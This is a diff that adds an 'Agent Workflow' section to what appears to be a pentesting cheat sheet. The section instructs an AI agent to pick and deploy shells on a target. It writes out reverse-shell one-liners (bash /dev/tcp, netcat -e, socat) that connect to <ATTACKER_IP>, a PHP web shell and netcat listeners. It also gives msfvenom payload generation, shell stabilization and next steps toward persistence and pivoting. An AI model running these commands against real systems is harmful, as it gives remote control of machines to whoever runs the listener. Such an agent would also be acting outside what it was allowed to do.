@@ -352,6 +352,99 @@ echo '7061796c6f6164' | xxd -r -p
 
 ---
 
+## Agent Workflow
+> Step-by-step instructions for an AI agent to select and deploy shells and payloads.
+
+### Phase 1: Assess the Situation
+1. Identify the target operating system (Linux, Windows, macOS)
+2. Identify the available interpreters/tools on the target:
+   - Check for: bash, python3, python2, perl, ruby, php, nc/ncat, socat, PowerShell
+3. Determine the network path:
+   - Can the target reach the attacker directly? (reverse shell)
+   - Can the attacker reach the target? (bind shell)
+   - Is there egress filtering? (may need DNS tunneling or encrypted channels)
+4. Determine if a web shell or interactive shell is needed
+5. Set up the listener on the attacker machine before deploying the payload
+
+### Phase 2: Select and Deploy
+1. **Reverse shell selection** (prefer in this order based on reliability):
+   - **Bash** (Linux, most reliable): `bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1`
+   - **Python** (cross-platform): `python3 -c 'import socket,subprocess,os;...'`
+   - **PowerShell** (Windows): `powershell -nop -c "$client = New-Object ..."`
+   - **Netcat** (if available): `nc -e /bin/sh <ATTACKER_IP> <PORT>` or mkfifo variant
+   - **Socat** (encrypted, interactive): `socat exec:'bash -li',pty,stderr,sane tcp:<ATTACKER_IP>:<PORT>`
+   - **PHP/Perl/Ruby**: use if the above are unavailable
+2. **Web shell selection** (for file upload or code injection):
+   - PHP: `<?php system($_GET['cmd']); ?>`
+   - ASP/ASPX, JSP: use Kali's built-in webshells at `/usr/share/webshells/`
+3. **Listener setup**:
+   ```
+   nc -lvnp <PORT>            # Basic
+   pwncat-cs -lp <PORT>       # Auto-upgrade, file transfer
+   rlwrap nc -lvnp <PORT>     # For Windows targets (readline support)
+   ```
+4. **Payload generation** (for compiled payloads):
+   ```
+   msfvenom -p <PAYLOAD> LHOST=<IP> LPORT=<PORT> -f <FORMAT> > shell.<EXT>
+   ```
+
+### Phase 3: Stabilize the Shell
+1. Upgrade to interactive PTY (Linux targets):
+   ```
+   python3 -c 'import pty; pty.spawn("/bin/bash")'
+   # Ctrl+Z
+   stty raw -echo; fg
+   export TERM=xterm
+   ```
+2. Fix terminal size: `stty rows <ROWS> cols <COLS>`
+3. For Windows targets: use `rlwrap` on the listener for readline support
+4. Consider upgrading to pwncat for auto-stabilization and built-in file transfer
+
+### Phase 4: Next Steps
+- Transfer tools to the target using [file transfer methods](#file-transfer-methods)
+- Begin privilege escalation enumeration
+- Establish persistence if required and authorized
+- Set up [pivoting](../../infra/helpers/pivoting.md) if internal networks are reachable
+
+## Decision Tree
+
+```
+START: Code execution achieved on target
+  |
+  +--> Identify target OS
+  |      |
+  |      +--> Linux --> Check for bash, python3, nc, socat
+  |      +--> Windows --> Check for PowerShell, certutil, nc
+  |
+  +--> Network path assessment
+  |      |
+  |      +--> Outbound allowed? --> Reverse shell
+  |      +--> Inbound allowed? --> Bind shell
+  |      +--> Restricted egress? --> Encrypted tunnel (socat SSL, DNS)
+  |
+  +--> Deploy shell
+  |      |
+  |      +--> Interactive access needed? --> Reverse shell + PTY upgrade
+  |      +--> File upload available? --> Web shell
+  |      +--> Compiled payload needed? --> msfvenom generation
+  |
+  +--> Stabilize
+  |      |
+  |      +--> Linux? --> Python PTY + stty raw
+  |      +--> Windows? --> rlwrap + ConPTY
+  |
+  +--> Post-exploitation: file transfer, privesc, pivoting
+```
+
+## Success Criteria
+
+- [ ] Target OS and available interpreters identified
+- [ ] Network path assessed (reverse vs bind vs tunnel)
+- [ ] Listener configured on attacker machine
+- [ ] Shell deployed and connection established
+- [ ] Shell stabilized with interactive PTY (if Linux)
+- [ ] File transfer method verified for tool deployment
+
 ## Resources
 
 - [revshells.com](https://www.revshells.com/)
